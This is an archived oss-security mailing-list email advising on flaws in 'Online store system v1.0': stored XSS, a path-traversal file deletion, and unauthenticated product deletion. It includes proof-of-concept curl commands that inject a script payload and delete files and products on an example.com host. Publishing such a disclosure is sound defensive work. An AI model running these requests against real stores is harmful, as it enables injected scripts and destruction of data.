X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2226" "Wednesday" "2" "October" "2019" "06:42:19" "-0400" "Akamai" "larry0@me.com" "<E37AAD4E-43F8-493A-AEEC-9FAE1A3D8E66@me.com>" "48" "[oss-security] Multiple vulnerabilities in Online store system v1.0 Stored XSS and unauthenticated product deletions." nil nil nil "10" "2019100210:42:19" "[oss-security] Multiple vulnerabilities in Online store system v1.0 Stored XSS and unauthenticated product deletions." (number mark "U       larry0@me.co Oct  2   48/2226  " thread-indent "\"[oss-security] Multiple vulnerabilities in Online store system v1.0 Stored XSS and unauthenticated product deletions.\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Multiple vulnerabilities in Online store system v1.0 Stored XSS and unauthenticated product deletions." nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24463 invoked by uid 550); 2 Oct 2019 10:42:34 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24445 invoked from network); 2 Oct 2019 10:42:33 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=1a1hai;
	t=1570012941; bh=pIdNdQp4g8Fp7EYPEcmoSrXR3AWltAHGdpavk+9WYn4=;
	h=Date:Subject:From:To:Message-ID:Content-type;
	b=SrjVc7ytP+nGKF3ht/bw3h/2nh1RJntO0ENAgWPEzrW0nXc7SW1pAXnTHBkMNxorr
	 8/1cNQZzYM/k5iQcNkobKEbaj3S3GoOBG47vbFLU2/LBStU9tfw7z5KagR8WHyD2Zl
	 5ddkTuCfYSg0TAJ2FTMCh3TAym/o4/3pX5/XhSxutFVk6BjFDc1EzuNASGOHDZ6ln7
	 kGxJqqmTB4nAfeXEcdZqfiJi7zHA9mj47y5v2w8xkp0oiAnzPu5SSmiuK6VDmxbsbw
	 mE1B8BwS4aD4A1Dqd8X+FnKnNfHVnV+dhZWMjETnmuQPyikc7W1cJUS7+tPHrlj9FW
	 YrI536LMvHBCg==
User-Agent: Microsoft-MacOutlook/10.1d.0.190908
Date: Wed, 02 Oct 2019 06:42:19 -0400
From: Akamai <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-ID: <E37AAD4E-43F8-493A-AEEC-9FAE1A3D8E66@me.com>
Thread-Topic: Multiple vulnerabilities in Online store system v1.0 Stored XSS
 and unauthenticated product deletions.
Mime-version: 1.0
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: quoted-printable
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,, definitions=2019-10-02_06:,,
 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0 malwarescore=0
 phishscore=0 bulkscore=0 spamscore=0 clxscore=1011 mlxscore=0
 mlxlogscore=999 adultscore=0 classifier=spam adjust=0 reason=mlx
 scancount=1 engine=8.0.1-1906280000 definitions=main-1910020101
Subject: [oss-security] Multiple vulnerabilities in Online store system v1.0 Stored XSS and
 unauthenticated product deletions.

Title:=C2=A0Multiple vulnerabilities in Online store system v1.0 Stored XSS=
 and unauthenticated product deletions.
Author:=C2=A0Larry W. Cashdollar @_larry0
Date:=C2=A02019-09-18
CVE-IDs: CVE-2019-8288 CVE-2019-8289 CVE-2019-8290 CVE-2019-8291
Download Site:=C2=A0https://www.abcprintf.com/view_download.php?id=3D17
Vendor:=C2=A0adcprintf
Vendor Notified:=C2=A02019-09-18
Vendor Contact:=C2=A0abcprintf@gmail.com
Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D210
Description:=C2=A0"Online store system" is a drop in customizable electroni=
c store front. It has an administrative interface allowing user and product=
 management.=20
Vulnerability:
The application contains stored XSS vulnerabilities throughout the form pag=
e user_view.php  as none of the variables are sanitized before being presen=
ted back to the client. This can be exploited by a new user injecting cooki=
e stealing code into their login information form and waiting for an admini=
strative user to navigate to the users panel.=20

CVE-2019-8288=20
159  echo '<td>'.$row['adidas_member_user'].'</td>';=20
CVE-2019-8289=20
160 echo '<td>'. $row['adidas_member_email'] . '</td>';
 CVE-2019-8290 The registration form requirements for the member email form=
at can be bypassed by posting directly to sent_register.php allowing specia=
l characters to be included and an XSS payload to be injected.=20
CVE-2019-8291 The code in delete_file.php doesn't check to see if a user ha=
s administrative rights nor does it check for path traversal allowing a '..=
' to delete arbitrary files owned by the httpd process.=20
CVE-2019-8292 The code in delete_product.php doesn't check to see if a user=
 has administrative rights before allowing them to delete a product from th=
e database.
Exploit Code:
1. Set login name or email to "><script>alert(1);</script>
2. $ curl -s cookie.txt -X POST -d "username=3Djsmith&password=3Djsmith123&=
email=3D\"><script>alert(1);</script>%40email.com" http://example.com/pso/s=
ent_register.php
3. =C2=A0
4. =C2=A0
5. $ curl -s cookie.txt "http://example.com/pso/admin/delete_file.php?id=3D=
0&filename=3D../women.php"
6. =C2=A0
7. $ curl -s cookie.txt http://example.com/pso/admin/product_delete.php?id=
=3D4



